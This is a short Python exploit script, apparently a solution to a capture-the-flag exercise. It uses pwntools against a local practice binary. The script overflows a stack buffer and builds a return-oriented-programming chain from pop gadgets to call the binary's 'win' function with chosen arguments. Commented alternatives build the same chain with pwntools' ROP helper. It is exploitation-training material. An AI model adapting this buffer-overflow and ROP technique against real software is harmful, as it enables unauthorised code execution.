#!/usr/bin/env python3

from pwn import *

io = process("./chall-4-64")

exe = ELF("./chall-4-64")
# context.binary = exe
# context.arch = "amd64"


arg1 = p64(0x7a69)
# arg1 = pack(0x7a69)

arg2 = pack(-1337, 64, 'little', True)
# arg2 = pack(-1337)

win = exe.symbols['win']
main = exe.symbols['main']

pad = 0x10 + 0x8

rdi = 0x0000000000401303
rsi_r15 = 0x0000000000401301

# payload = b"A" * pad + p64(rdi) + arg1 + p64(rsi_r15) + arg2 + p64(1337) + p64(win) + p64(main)
payload = b"A" * pad + pack(rdi) + arg1 + pack(rsi_r15) + arg2 + pack(1337) + pack(win) + pack(main)

# ROPgadget --binary ./chall-4-64 --only 'pop|ret'

# rop = ROP(exe)
# rop.raw(b"A" * pad)
# rop.raw(rop.rdi.address)
# rop.raw(arg1)
# rop.raw(rop.rsi.address)
# rop.raw(arg2)
# rop.raw(pack(1337))
# rop.raw(win)
# rop.raw(main)
# print(rop.dump())

# rop = ROP(exe)
# rop.raw(b"A" * pad)
# rop.call(win, arguments=(31337, -1337))
# rop.call(main)
# print(rop.dump())

# payload = rop.chain()

io.sendlineafter(b"Buf: ", payload)

io.interactive()
